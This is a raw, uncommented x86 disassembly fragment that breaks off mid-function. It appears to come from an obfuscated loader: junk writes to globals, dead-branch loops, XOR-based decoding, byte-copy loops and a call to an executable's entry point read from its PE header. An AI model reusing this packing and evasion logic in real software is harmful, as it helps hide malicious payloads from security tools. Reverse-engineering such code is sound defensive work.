  41b8e1:	sbb    DWORD PTR ds:0x42b008,0x4024
  41b8eb:	push   0xc
  41b8ed:	mov    DWORD PTR ds:0x429000,0x5718
  41b8f7:	push   0x3
  41b8f9:	and    DWORD PTR ds:0x42b004,0x67ab
  41b903:	push   0x2
  41b905:	push   0x78769798
  41b90a:	or     DWORD PTR ds:0x428024,0x42c014
  41b914:	call   DWORD PTR ds:0x42400c
  41b91a:	or     DWORD PTR ds:0x42c000,0x429014
  41b924:	push   0x57658733
  41b929:	and    DWORD PTR ds:0x42c000,0x42900c
  41b933:	call   DWORD PTR ds:0x424008
  41b939:	push   0x97667654
  41b93e:	call   DWORD PTR ds:0x424000
  41b944:	movzx  eax,BYTE PTR ds:0x428004
  41b94b:	mov    eax,DWORD PTR [ebp-0x18]
  41b94e:	cmp    eax,0xf89c85b6
  41b953:	mov    DWORD PTR ds:0x42c018,0x6f46
  41b95d:	jne    0x41ba3b
  41b963:	sub    DWORD PTR ds:0x42b018,0x42901c
  41b96d:	xor    edi,edi
  41b96f:	inc    edi
  41b970:	xor    esi,esi
  41b972:	inc    esi
  41b973:	mov    DWORD PTR ds:0x429018,0x36e4
  41b97d:	mov    DWORD PTR ds:0x421d26,0xf89c85b5
  41b987:	mov    DWORD PTR ds:0x42c004,0x59b7
  41b991:	cmp    edi,0x20
  41b994:	mov    DWORD PTR ds:0x42c000,0x70dd
  41b99e:	jne    0x41ba00
  41b9a4:	mov    DWORD PTR ds:0x428000,0x41f9
  41b9ae:	cmp    esi,edi
  41b9b0:	mov    DWORD PTR ds:0x42901c,0x1be9
  41b9ba:	jne    0x41ba00
  41b9c0:	or     DWORD PTR ds:0x429010,0x42900c
  41b9ca:	push   DWORD PTR [ebp+0x10]
  41b9cd:	and    DWORD PTR ds:0x428004,0x1bdc
  41b9d7:	push   DWORD PTR [ebp+0xc]
  41b9da:	add    DWORD PTR ds:0x428008,0x6df8
  41b9e4:	push   DWORD PTR [ebp+0x8]
  41b9e7:	call   0x41b718
  41b9ec:	mov    ecx,DWORD PTR ds:0x428018
  41b9f2:	mov    ecx,DWORD PTR ds:0x421c16
  41b9f8:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41b9fe:	mov    DWORD PTR [ecx],eax
  41ba00:	mov    DWORD PTR ds:0x42a018,0x7241
  41ba0a:	inc    esi
  41ba0b:	mov    DWORD PTR ds:0x42b01c,0x57c2
  41ba15:	cmp    esi,0x21
  41ba18:	jne    0x41b973
  41ba1e:	mov    DWORD PTR ds:0x42a010,0x26a0
  41ba28:	inc    edi
  41ba29:	cmp    edi,esi
  41ba2b:	mov    DWORD PTR ds:0x429008,0x19e2
  41ba35:	jne    0x41b970
  41ba3b:	mov    edx,0xf89c85b6
  41ba40:	and    DWORD PTR ds:0x42b014,0x0
  41ba4a:	mov    esi,DWORD PTR ds:0x42b014
  41ba50:	inc    esi
  41ba51:	mov    DWORD PTR ds:0x42b014,esi
  41ba57:	cmp    DWORD PTR ds:0x42b014,0x6
  41ba5e:	jne    0x41ba8c
  41ba64:	push   0x429014
  41ba69:	push   0x534b
  41ba6e:	push   DWORD PTR [ebp-0x18]
  41ba71:	push   0x428028
  41ba76:	push   0x4cdf
  41ba7b:	push   0x4239c2
  41ba80:	push   DWORD PTR [ebp-0x28]
  41ba83:	push   DWORD PTR [ebp-0x10]
  41ba86:	call   DWORD PTR ds:0x424024
  41ba8c:	cmp    DWORD PTR ds:0x42b014,0x5
  41ba93:	jne    0x41baa6
  41ba99:	mov    esi,DWORD PTR ds:0x42b014
  41ba9f:	inc    esi
  41baa0:	mov    DWORD PTR ds:0x42b014,esi
  41baa6:	cmp    DWORD PTR ds:0x42b014,0x11
  41baad:	jb     0x41ba4a
  41bab3:	adc    esi,DWORD PTR ds:0x429000
  41bab9:	mov    DWORD PTR [ebp-0x4],edx
  41babc:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41bac3:	add    ecx,0x1410
  41bac9:	lea    eax,[ebp-0x44]
  41bacc:	xor    edi,edi
  41bace:	xor    edi,DWORD PTR ds:0x42b008
  41bad4:	add    edi,DWORD PTR ds:0x42800c
  41bada:	mov    DWORD PTR ds:0x42b008,edi
  41bae0:	mov    DWORD PTR [ebp-0x3c],eax
  41bae3:	lea    eax,[ebp-0x48]
  41bae6:	or     edi,esi
  41bae8:	mov    DWORD PTR [ebp-0x24],eax
  41baeb:	mov    eax,ds:0x421c16
  41baf0:	adc    DWORD PTR ds:0x428014,ebx
  41baf6:	mov    eax,DWORD PTR [eax+0x1c8]
  41bafc:	and    DWORD PTR ds:0x42a01c,0x0
  41bb06:	jmp    0x41bb18
  41bb0b:	mov    edi,DWORD PTR ds:0x42a01c
  41bb11:	inc    edi
  41bb12:	mov    DWORD PTR ds:0x42a01c,edi
  41bb18:	cmp    DWORD PTR ds:0x42a01c,0x1f
  41bb1f:	jae    0x41bb48
  41bb25:	cmp    DWORD PTR ds:0x42a01c,0x2a
  41bb2c:	jne    0x41bb43
  41bb32:	push   DWORD PTR [ebp-0x24]
  41bb35:	push   DWORD PTR [ebp-0x1c]
  41bb38:	push   0x27cc
  41bb3d:	call   DWORD PTR ds:0x424028
  41bb43:	jmp    0x41bb0b
  41bb48:	mov    eax,DWORD PTR [eax]
  41bb4a:	xor    esi,esi
  41bb4c:	or     esi,DWORD PTR ds:0x429000
  41bb52:	adc    DWORD PTR ds:0x429014,esi
  41bb58:	mov    ecx,DWORD PTR [ebp-0x24]
  41bb5b:	mov    esi,0x7510893
  41bb60:	mov    edi,DWORD PTR ds:0x429010
  41bb66:	or     edi,DWORD PTR ds:0x42a01c
  41bb6c:	mov    DWORD PTR ds:0x429010,edi
  41bb72:	xor    eax,esi
  41bb74:	movzx  edi,BYTE PTR ds:0x42a014
  41bb7b:	adc    edi,DWORD PTR ds:0x42a004
  41bb81:	mov    DWORD PTR ds:0x42a014,edi
  41bb87:	mov    edi,0x3272db
  41bb8c:	add    DWORD PTR ds:0x428000,0x429004
  41bb96:	add    eax,edi
  41bb98:	mov    DWORD PTR ds:0x428000,0xa07
  41bba2:	mov    DWORD PTR [ecx],eax
  41bba4:	mov    eax,0x1dcc
  41bba9:	mov    eax,ds:0x421e32
  41bbae:	cmp    eax,0x301ac8f5
  41bbb3:	mov    DWORD PTR ds:0x42a01c,0x9b1
  41bbbd:	jne    0x41bc4c
  41bbc3:	or     ecx,DWORD PTR ds:0x42b014
  41bbc9:	mov    eax,DWORD PTR [ebp-0x4]
  41bbcc:	dec    DWORD PTR ds:0x429000
  41bbd2:	mov    ecx,DWORD PTR ds:0x421c16
  41bbd8:	adc    DWORD PTR ds:0x42a004,ebx
  41bbde:	mov    ecx,DWORD PTR [ecx+0x198]
  41bbe4:	add    ebx,DWORD PTR ds:0x428014
  41bbea:	xor    eax,esi
  41bbec:	sbb    ebx,DWORD PTR ds:0x429010
  41bbf2:	add    eax,edi
  41bbf4:	mov    DWORD PTR [ecx],eax
  41bbf6:	and    DWORD PTR ds:0x428000,0x0
  41bc00:	xor    eax,eax
  41bc02:	add    eax,DWORD PTR ds:0x428000
  41bc08:	inc    eax
  41bc09:	mov    ds:0x428000,eax
  41bc0e:	cmp    DWORD PTR ds:0x428000,0x23
  41bc15:	jne    0x41bc2b
  41bc1b:	push   0x42388f
  41bc20:	push   0x4238c3
  41bc25:	call   DWORD PTR ds:0x424030
  41bc2b:	cmp    DWORD PTR ds:0x428000,0x17
  41bc32:	jb     0x41bc00
  41bc38:	mov    eax,DWORD PTR [ebp-0x4]
  41bc3b:	and    DWORD PTR ds:0x42a018,edx
  41bc41:	xor    eax,esi
  41bc43:	xor    ebx,ebx
  41bc45:	add    eax,edi
  41bc47:	mov    ds:0x421e32,eax
  41bc4c:	sub    eax,eax
  41bc4e:	mov    eax,ds:0x421c16
  41bc53:	adc    DWORD PTR ds:0x42b018,0x29cb
  41bc5d:	mov    eax,DWORD PTR [eax+0x18c]
  41bc63:	and    DWORD PTR ds:0x42a004,0x0
  41bc6d:	mov    ebx,DWORD PTR ds:0x42a004
  41bc73:	inc    ebx
  41bc74:	mov    DWORD PTR ds:0x42a004,ebx
  41bc7a:	cmp    DWORD PTR ds:0x42a004,0x13
  41bc81:	jne    0x41bca9
  41bc87:	push   0x49d6
  41bc8c:	push   0x649f
  41bc91:	push   DWORD PTR [ebp-0x20]
  41bc94:	push   0x2fe7
  41bc99:	push   0x2c94
  41bc9e:	push   0x42c018
  41bca3:	call   DWORD PTR ds:0x424038
  41bca9:	cmp    DWORD PTR ds:0x42a004,0x11
  41bcb0:	jb     0x41bc6d
  41bcb6:	xor    ecx,ecx
  41bcb8:	xor    ecx,DWORD PTR ds:0x42b004
  41bcbe:	sbb    ecx,DWORD PTR ds:0x42a008
  41bcc4:	mov    DWORD PTR ds:0x42b004,ecx
  41bcca:	mov    eax,DWORD PTR [eax]
  41bccc:	and    DWORD PTR ds:0x429004,0x0
  41bcd6:	xor    ecx,ecx
  41bcd8:	xor    ecx,DWORD PTR ds:0x429004
  41bcde:	inc    ecx
  41bcdf:	mov    DWORD PTR ds:0x429004,ecx
  41bce5:	cmp    DWORD PTR ds:0x429004,0xe
  41bcec:	jne    0x41bd02
  41bcf2:	push   0x42c014
  41bcf7:	push   0x2d10
  41bcfc:	call   DWORD PTR ds:0x42403c
  41bd02:	cmp    DWORD PTR ds:0x429004,0xd
  41bd09:	jne    0x41bd1c
  41bd0f:	mov    ecx,DWORD PTR ds:0x429004
  41bd15:	inc    ecx
  41bd16:	mov    DWORD PTR ds:0x429004,ecx
  41bd1c:	cmp    DWORD PTR ds:0x429004,0x1a
  41bd23:	jb     0x41bcd6
  41bd29:	or     ecx,ecx
  41bd2b:	mov    DWORD PTR [ebp-0x4c],eax
  41bd2e:	mov    ecx,0xf89c85ba
  41bd33:	sub    ebx,DWORD PTR ds:0x42c000
  41bd39:	mov    DWORD PTR [ebp-0x38],ecx
  41bd3c:	and    DWORD PTR ds:0x428024,edx
  41bd42:	mov    DWORD PTR [ebp-0x38],ecx
  41bd45:	and    DWORD PTR ds:0x42c014,0x0
  41bd4f:	mov    ebx,DWORD PTR ds:0x42c014
  41bd55:	inc    ebx
  41bd56:	mov    DWORD PTR ds:0x42c014,ebx
  41bd5c:	cmp    DWORD PTR ds:0x42c014,0x10
  41bd63:	jne    0x41bd77
  41bd69:	push   DWORD PTR [ebp-0x10]
  41bd6c:	push   0x42390e
  41bd71:	call   DWORD PTR ds:0x424040
  41bd77:	cmp    DWORD PTR ds:0x42c014,0xf
  41bd7e:	jne    0x41bd91
  41bd84:	mov    ebx,DWORD PTR ds:0x42c014
  41bd8a:	inc    ebx
  41bd8b:	mov    DWORD PTR ds:0x42c014,ebx
  41bd91:	cmp    DWORD PTR ds:0x42c014,0x1f
  41bd98:	jb     0x41bd4f
  41bd9e:	sub    eax,eax
  41bda0:	mov    DWORD PTR [ebp-0x38],ecx
  41bda3:	or     DWORD PTR ds:0x429014,0x293b
  41bdad:	mov    DWORD PTR [ebp-0x30],edx
  41bdb0:	sub    edx,0x44be
  41bdb6:	mov    DWORD PTR [ebp-0x38],ecx
  41bdb9:	add    eax,DWORD PTR ds:0x428000
  41bdbf:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  41bdc6:	mov    eax,DWORD PTR [ebp-0x4]
  41bdc9:	movzx  edx,WORD PTR ds:0x428020
  41bdd0:	add    DWORD PTR ds:0x42b00c,edx
  41bdd6:	mov    edx,DWORD PTR [ebp-0x8]
  41bdd9:	adc    ebx,0x414f
  41bddf:	mov    ebx,DWORD PTR [ebp-0x8]
  41bde2:	xor    ebx,esi
  41bde4:	and    DWORD PTR ds:0x42c018,0x42a004
  41bdee:	xor    edx,esi
  41bdf0:	add    edx,ebx
  41bdf2:	movzx  ebx,BYTE PTR ds:0x42a01c
  41bdf9:	and    DWORD PTR ds:0x429018,ebx
  41bdff:	mov    ebx,DWORD PTR [ebp-0x8]
  41be02:	xor    ebx,esi
  41be04:	xor    DWORD PTR ds:0x428028,0x1d40
  41be0e:	xor    eax,esi
  41be10:	sbb    DWORD PTR ds:0x42a008,0x42a018
  41be1a:	add    eax,edi
  41be1c:	lea    edx,[edx+ebx*1+0x975891]
  41be23:	mov    ebx,0x7216
  41be28:	mov    DWORD PTR [ebp-0x14],eax
  41be2b:	mov    ebx,0x8a29a123
  41be30:	mov    DWORD PTR ds:0x429018,0x7968
  41be3a:	cmp    eax,edx
  41be3c:	ja     0x41c14b
  41be42:	mov    DWORD PTR ds:0x42a008,0x16
  41be4c:	cmp    DWORD PTR ds:0x42a008,0x0
  41be53:	je     0x41bea1
  41be59:	cmp    DWORD PTR ds:0x42a008,0xa
  41be60:	jne    0x41be71
  41be66:	push   0x4238c3
  41be6b:	call   DWORD PTR ds:0x424044
  41be71:	cmp    DWORD PTR ds:0x42a008,0xb
  41be78:	jne    0x41be8d
  41be7e:	xor    ecx,ecx
  41be80:	xor    ecx,DWORD PTR ds:0x42a008
  41be86:	dec    ecx
  41be87:	mov    DWORD PTR ds:0x42a008,ecx
  41be8d:	xor    ecx,ecx
  41be8f:	add    ecx,DWORD PTR ds:0x42a008
  41be95:	dec    ecx
  41be96:	mov    DWORD PTR ds:0x42a008,ecx
  41be9c:	jmp    0x41be4c
  41bea1:	mov    ecx,DWORD PTR [ebp-0x8]
  41bea4:	xor    ecx,esi
  41bea6:	lea    ecx,[ecx+eax*1+0x3272db]
  41bead:	or     DWORD PTR ds:0x429014,0x429018
  41beb7:	mov    DWORD PTR [ebp-0x10],ecx
  41beba:	mov    ecx,DWORD PTR [ebp-0x30]
  41bebd:	xor    ecx,esi
  41bebf:	adc    edx,0x7be1
  41bec5:	lea    ecx,[ebp+ecx*1+0x3272e3]
  41becc:	add    DWORD PTR ds:0x42b00c,0x3739
  41bed6:	mov    DWORD PTR [ebp-0x38],ecx
  41bed9:	and    DWORD PTR ds:0x429010,0x0
  41bee3:	mov    edx,DWORD PTR ds:0x429010
  41bee9:	inc    edx
  41beea:	mov    DWORD PTR ds:0x429010,edx
  41bef0:	cmp    DWORD PTR ds:0x429010,0x21
  41bef7:	jne    0x41bf12
  41befd:	push   0x1770
  41bf02:	push   0x42c01c
  41bf07:	push   0x423986
  41bf0c:	call   DWORD PTR ds:0x424048
  41bf12:	cmp    DWORD PTR ds:0x429010,0x1b
  41bf19:	jb     0x41bee3
  41bf1f:	mov    ecx,DWORD PTR ds:0x421c16
  41bf25:	mov    ecx,DWORD PTR [ecx+0x1bc]
  41bf2b:	and    DWORD PTR ds:0x42900c,0x0
  41bf35:	jmp    0x41bf47
  41bf3a:	mov    edx,DWORD PTR ds:0x42900c
  41bf40:	inc    edx
  41bf41:	mov    DWORD PTR ds:0x42900c,edx
  41bf47:	cmp    DWORD PTR ds:0x42900c,0x19
  41bf4e:	jae    0x41bf96
  41bf54:	cmp    DWORD PTR ds:0x42900c,0xa
  41bf5b:	jne    0x41bf6f
  41bf61:	push   0x42900c
  41bf66:	push   DWORD PTR [ebp-0x28]
  41bf69:	call   DWORD PTR ds:0x424014
  41bf6f:	cmp    DWORD PTR ds:0x42900c,0x9
  41bf76:	jne    0x41bf8b
  41bf7c:	xor    edx,edx
  41bf7e:	or     edx,DWORD PTR ds:0x42900c
  41bf84:	inc    edx
  41bf85:	mov    DWORD PTR ds:0x42900c,edx
  41bf8b:	jmp    0x41bf3a
  41bf90:	adc    edx,DWORD PTR ds:0x42b00c
  41bf96:	mov    DWORD PTR [ebp-0xc],0xf89c85b6
  41bf9d:	and    DWORD PTR ds:0x42b00c,0x0
  41bfa7:	jmp    0x41bfbb
  41bfac:	xor    edx,edx
  41bfae:	xor    edx,DWORD PTR ds:0x42b00c
  41bfb4:	inc    edx
  41bfb5:	mov    DWORD PTR ds:0x42b00c,edx
  41bfbb:	cmp    DWORD PTR ds:0x42b00c,0x10
  41bfc2:	jae    0x41c020
  41bfc8:	cmp    DWORD PTR ds:0x42b00c,0x5
  41bfcf:	jne    0x41bfff
  41bfd5:	push   0x33b5
  41bfda:	push   0x42b014
  41bfdf:	push   0x1dc5
  41bfe4:	push   0x42801c
  41bfe9:	push   DWORD PTR [ebp-0x14]
  41bfec:	push   0x39d8
  41bff1:	push   DWORD PTR [ebp-0x14]
  41bff4:	push   0x8914
  41bff9:	call   DWORD PTR ds:0x424018
  41bfff:	cmp    DWORD PTR ds:0x42b00c,0x4
  41c006:	jne    0x41c01b
  41c00c:	xor    edx,edx
  41c00e:	xor    edx,DWORD PTR ds:0x42b00c
  41c014:	inc    edx
  41c015:	mov    DWORD PTR ds:0x42b00c,edx
  41c01b:	jmp    0x41bfac
  41c020:	mov    DWORD PTR [ebp-0x34],ecx
  41c023:	and    DWORD PTR ds:0x42b01c,0x11ac
  41c02d:	mov    DWORD PTR [ebp-0x20],0xf89c85b5
  41c034:	sub    ecx,ecx
  41c036:	mov    ecx,DWORD PTR [ebp-0xc]
  41c039:	or     edx,DWORD PTR ds:0x428018
  41c03f:	mov    edx,DWORD PTR [ebp-0x10]
  41c042:	xor    ecx,esi
  41c044:	add    ecx,edi
  41c046:	cmp    ecx,edx
  41c048:	je     0x41c117
  41c04e:	mov    eax,DWORD PTR [ebp-0xc]
  41c051:	mov    ecx,DWORD PTR [ebp-0x10]
  41c054:	xor    edx,edx
  41c056:	xor    eax,esi
  41c058:	add    eax,edi
  41c05a:	add    ecx,0xfabdbef1
  41c060:	adc    edx,0xffffffff
  41c063:	xor    ecx,ebx
  41c065:	xor    edx,0x0
  41c068:	mov    DWORD PTR [ebp-0x68],ecx
  41c06b:	mov    DWORD PTR [ebp-0x64],edx
  41c06e:	xor    edx,edx
  41c070:	mov    ecx,eax
  41c072:	add    ecx,0xfabdbef1
  41c078:	adc    edx,0xffffffff
  41c07b:	xor    ecx,ebx
  41c07d:	xor    edx,0x0
  41c080:	mov    DWORD PTR [ebp-0x24],eax
  41c083:	mov    DWORD PTR [ebp-0x74],edx
  41c086:	cmp    ecx,DWORD PTR [ebp-0x68]
  41c089:	jne    0x41c09a
  41c08f:	mov    ecx,DWORD PTR [ebp-0x64]
  41c092:	cmp    edx,ecx
  41c094:	je     0x41c114
  41c09a:	mov    ecx,DWORD PTR [ebp-0xc]
  41c09d:	mov    edx,DWORD PTR [ebp-0x20]
  41c0a0:	xor    edx,esi
  41c0a2:	add    edx,edi
  41c0a4:	imul   edx,eax
  41c0a7:	xor    ecx,esi
  41c0a9:	add    ecx,eax
  41c0ab:	mov    eax,DWORD PTR [ebp-0x34]
  41c0ae:	mov    ebx,DWORD PTR [ebp-0x38]
  41c0b1:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c0b8:	mov    BYTE PTR [edx+eax*1],cl
  41c0bb:	mov    eax,DWORD PTR [ebp-0x20]
  41c0be:	mov    ecx,DWORD PTR [ebp-0x24]
  41c0c1:	xor    eax,esi
  41c0c3:	lea    eax,[ecx+eax*1+0x3272db]
  41c0ca:	mov    ecx,DWORD PTR [ebp-0x10]
  41c0cd:	xor    edx,edx
  41c0cf:	add    ecx,0xfabdbef1
  41c0d5:	adc    edx,0xffffffff
  41c0d8:	xor    edx,0x0
  41c0db:	mov    ebx,0x8a29a123
  41c0e0:	xor    ecx,ebx
  41c0e2:	mov    DWORD PTR [ebp-0x70],ecx
  41c0e5:	mov    DWORD PTR [ebp-0x6c],edx
  41c0e8:	xor    edx,edx
  41c0ea:	mov    ecx,eax
  41c0ec:	add    ecx,0xfabdbef1
  41c0f2:	adc    edx,0xffffffff
  41c0f5:	xor    ecx,ebx
  41c0f7:	xor    edx,0x0
  41c0fa:	mov    DWORD PTR [ebp-0x24],eax
  41c0fd:	mov    DWORD PTR [ebp-0x7c],edx
  41c100:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c103:	jne    0x41c09a
  41c109:	mov    ecx,DWORD PTR [ebp-0x6c]
  41c10c:	cmp    edx,ecx
  41c10e:	jne    0x41c09a
  41c114:	mov    eax,DWORD PTR [ebp-0x14]
  41c117:	mov    ecx,DWORD PTR [ebp-0x8]
  41c11a:	xor    ecx,esi
  41c11c:	lea    eax,[eax+ecx*1+0x3272db]
  41c123:	mov    ecx,DWORD PTR [ebp-0x8]
  41c126:	mov    edx,DWORD PTR [ebp-0x8]
  41c129:	xor    edx,esi
  41c12b:	xor    ecx,esi
  41c12d:	add    ecx,edx
  41c12f:	mov    edx,DWORD PTR [ebp-0x8]
  41c132:	xor    edx,esi
  41c134:	lea    ecx,[ecx+edx*1+0x975891]
  41c13b:	mov    DWORD PTR [ebp-0x14],eax
  41c13e:	cmp    eax,ecx
  41c140:	jbe    0x41be42
  41c146:	mov    ecx,0xf89c85ba
  41c14b:	mov    eax,DWORD PTR [ebp+0xc]
  41c14e:	mov    ds:0x421a9a,eax
  41c153:	mov    eax,DWORD PTR [ebp+0x10]
  41c156:	mov    ds:0x421cee,eax
  41c15b:	mov    eax,ds:0x421a9a
  41c160:	mov    edx,DWORD PTR [ebp-0x3c]
  41c163:	sub    eax,edi
  41c165:	xor    eax,esi
  41c167:	mov    DWORD PTR [edx],eax
  41c169:	mov    eax,DWORD PTR [ebp-0x18]
  41c16c:	cmp    eax,0xf89c85b6
  41c171:	jne    0x41c19c
  41c177:	lea    eax,[ebp-0x28]
  41c17a:	mov    DWORD PTR [ebp-0x40],eax
  41c17d:	lea    eax,[ebp+0x4]
  41c180:	mov    DWORD PTR [ebp-0x28],eax
  41c183:	mov    eax,DWORD PTR [ebp-0x28]
  41c186:	test   eax,eax
  41c188:	je     0x41c2b4
  41c18e:	mov    eax,DWORD PTR [ebp-0x1c]
  41c191:	mov    eax,DWORD PTR [ebp-0x8]
  41c194:	lea    eax,[ebp-0x40]
  41c197:	jmp    0x41c2ab
  41c19c:	mov    eax,DWORD PTR [ebp-0x44]
  41c19f:	cmp    eax,0xf89c85b5
  41c1a4:	je     0x41c201
  41c1aa:	mov    eax,DWORD PTR [ebp-0x4]
  41c1ad:	mov    edx,DWORD PTR [ebp-0x48]
  41c1b0:	xor    eax,esi
  41c1b2:	add    eax,edi
  41c1b4:	cmp    eax,edx
  41c1b6:	je     0x41c201
  41c1bc:	mov    eax,ds:0x421c16
  41c1c1:	mov    eax,DWORD PTR [eax+0x194]
  41c1c7:	mov    ecx,DWORD PTR [eax]
  41c1c9:	mov    eax,DWORD PTR [ecx+0x3c]
  41c1cc:	push   DWORD PTR ds:0x421cee
  41c1d2:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41c1d6:	push   DWORD PTR ds:0x421a9a
  41c1dc:	add    eax,ecx
  41c1de:	mov    ecx,DWORD PTR ds:0x421c16
  41c1e4:	mov    ecx,DWORD PTR [ecx+0x194]
  41c1ea:	push   DWORD PTR [ecx]
  41c1ec:	call   eax
  41c1ee:	mov    ecx,DWORD PTR ds:0x421c16
  41c1f4:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41c1fa:	mov    DWORD PTR [ecx],eax
  41c1fc:	jmp    0x41c2b4
  41c201:	mov    eax,DWORD PTR [ebp-0x4]
  41c204:	mov    edx,DWORD PTR [ebp-0x4c]
  41c207:	xor    eax,esi
  41c209:	add    eax,edi
  41c20b:	cmp    eax,edx
  41c20d:	jne    0x41c26a
  41c213:	mov    eax,DWORD PTR [ebp-0x4]
  41c216:	mov    edx,DWORD PTR ds:0x421c16
  41c21c:	mov    edx,DWORD PTR [edx+0x198]
  41c222:	xor    eax,esi
  41c224:	add    eax,edi
  41c226:	cmp    eax,DWORD PTR [edx]
  41c228:	jne    0x41c247
  41c22e:	mov    eax,DWORD PTR [ebp-0x4]
  41c231:	push   0xf89c85b6
  41c236:	xor    eax,esi
  41c238:	add    eax,edi
  41c23a:	push   eax
  41c23b:	push   ecx
  41c23c:	push   DWORD PTR [ebp-0x8]
  41c23f:	push   DWORD PTR [ebp-0x4]
  41c242:	call   0x413d37
  41c247:	push   DWORD PTR [ebp-0x8]
  41c24a:	push   DWORD PTR [ebp-0x4]
  41c24d:	call   0x41af10
  41c252:	mov    eax,DWORD PTR [ebp-0x4]
  41c255:	xor    eax,esi
  41c257:	add    eax,edi
  41c259:	mov    ds:0x421c9a,eax
  41c25e:	mov    eax,DWORD PTR [ebp-0x4]
  41c261:	xor    eax,esi
  41c263:	add    eax,edi
  41c265:	mov    ds:0x421c92,eax
  41c26a:	lea    eax,[ebp-0x2c]
  41c26d:	mov    DWORD PTR [ebp-0x50],eax
  41c270:	lea    eax,[ebp+0x4]
  41c273:	mov    DWORD PTR [ebp-0x2c],eax
  41c276:	mov    eax,DWORD PTR [ebp-0x2c]
  41c279:	test   eax,eax
  41c27b:	je     0x41c2b4
  41c281:	mov    DWORD PTR [ebp-0x54],0xf152c3d
  41c288:	mov    DWORD PTR [ebp-0x58],0x712ed08
  41c28f:	mov    DWORD PTR [ebp-0x5c],0x373fc2e
  41c296:	mov    DWORD PTR [ebp-0x60],0x72670a1e
  41c29d:	call   0x401000
  41c2a2:	mov    eax,DWORD PTR [ebp-0x1c]
  41c2a5:	mov    eax,DWORD PTR [ebp-0x8]
  41c2a8:	lea    eax,[ebp-0x50]
  41c2ab:	push   eax
  41c2ac:	push   DWORD PTR [ebp-0x4]
  41c2af:	call   0x40cf5e
  41c2b4:	mov    eax,ds:0x421c16
  41c2b9:	add    eax,0x1cc
  41c2be:	mov    DWORD PTR [ebp-0x38],eax
  41c2c1:	lea    eax,[ebp-0x1c]
  41c2c4:	mov    DWORD PTR [ebp+0xc],0xf89c85b6
  41c2cb:	mov    DWORD PTR [ebp-0x3c],eax
  41c2ce:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  41c2d5:	mov    eax,DWORD PTR [ebp+0xc]
  41c2d8:	xor    eax,esi
  41c2da:	mov    DWORD PTR [ebp+0x10],0x4
  41c2e1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2e4:	add    eax,edi
  41c2e6:	cmp    eax,ecx
  41c2e8:	je     0x41c3a9
  41c2ee:	mov    eax,DWORD PTR [ebp+0xc]
  41c2f1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2f4:	xor    edx,edx
  41c2f6:	xor    eax,esi
  41c2f8:	add    eax,edi
  41c2fa:	add    ecx,0xfabdbef1
  41c300:	adc    edx,0xffffffff
  41c303:	xor    ecx,ebx
  41c305:	xor    edx,0x0
  41c308:	mov    DWORD PTR [ebp-0x70],ecx
  41c30b:	mov    DWORD PTR [ebp-0x6c],edx
  41c30e:	xor    edx,edx
  41c310:	mov    ecx,eax
  41c312:	add    ecx,0xfabdbef1
  41c318:	adc    edx,0xffffffff
  41c31b:	xor    ecx,ebx
  41c31d:	xor    edx,0x0
  41c320:	mov    DWORD PTR [ebp-0x20],eax
  41c323:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c326:	jne    0x41c335
  41c32c:	cmp    edx,DWORD PTR [ebp-0x6c]
  41c32f:	je     0x41c3a9
  41c335:	mov    ecx,DWORD PTR [ebp+0xc]
  41c338:	mov    edx,DWORD PTR [ebp-0x24]
  41c33b:	xor    edx,esi
  41c33d:	xor    ecx,esi
  41c33f:	add    ecx,eax
  41c341:	add    edx,edi
  41c343:	imul   edx,eax
  41c346:	mov    eax,DWORD PTR [ebp-0x3c]
  41c349:	mov    ebx,DWORD PTR [ebp-0x38]
  41c34c:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c353:	mov    BYTE PTR [edx+eax*1],cl
  41c356:	mov    eax,DWORD PTR [ebp-0x24]
  41c359:	mov    ecx,DWORD PTR [ebp-0x20]
  41c35c:	mov    edx,DWORD PTR [ebp+0x10]
  41c35f:	xor    eax,esi
  41c361:	lea    eax,[ecx+eax*1+0x3272db]
  41c368:	xor    ecx,ecx
  41c36a:	add    edx,0xfabdbef1
  41c370:	adc    ecx,0xffffffff
  41c373:	xor    ecx,0x0
  41c376:	mov    DWORD PTR [ebp-0x7c],ecx
  41c379:	xor    ebx,ebx
  41c37b:	xor    edx,0x8a29a123
  41c381:	mov    ecx,eax
  41c383:	add    ecx,0xfabdbef1
  41c389:	adc    ebx,0xffffffff
  41c38c:	xor    ecx,0x8a29a123
  41c392:	xor    ebx,0x0
  41c395:	mov    DWORD PTR [ebp-0x20],eax
  41c398:	cmp    ecx,edx
  41c39a:	jne    0x41c335
  41c3a0:	cmp    ebx,DWORD PTR [ebp-0x7c]
  41c3a3:	jne    0x41c335
  41c3a9:	mov    eax,DWORD PTR [ebp-0x1c]
  41c3ac:	mov    eax,DWORD PTR [eax]
  41c3ae:	pop    edi
  41c3af:	pop    esi
  41c3b0:	pop    ebx
  41c3b1:	leave  
  41c3b2:	ret    0xc
  41c3b5:	push   ebp
  41c3b6:	mov    ebp,esp
  41c3b8:	sub    esp,0xa4
  41c3be:	mov    ecx,DWORD PTR [ebp+0x8]
  41c3c1:	and    DWORD PTR ds:0x42a01c,0x0
  41c3cb:	jmp    0x41c3db
  41c3d0:	mov    eax,ds:0x42a01c
  41c3d5:	inc    eax
  41c3d6:	mov    ds:0x42a01c,eax
  41c3db:	cmp    DWORD PTR ds:0x42a01c,0x17
  41c3e2:	jae    0x41c404
  41c3e8:	cmp    DWORD PTR ds:0x42a01c,0x25
  41c3ef:	jne    0x41c3fe
  41c3f5:	push   DWORD PTR [ebp-0x14]
  41c3f8:	call   DWORD PTR ds:0x42401c
  41c3fe:	jmp    0x41c3d0
  41c403:	inc    eax
  41c404:	mov    eax,0x8a85
  41c409:	sub    DWORD PTR ds:0x42a008,0x36bb
  41c413:	xor    ax,WORD PTR [ecx+0x20]
  41c417:	mov    DWORD PTR ds:0x42c018,0x1e
  41c421:	cmp    DWORD PTR ds:0x42c018,0x0
  41c428:	je     0x41c465
  41c42e:	cmp    DWORD PTR ds:0x42c018,0x25
  41c435:	jne    0x41c449
  41c43b:	push   DWORD PTR [ebp-0x10]
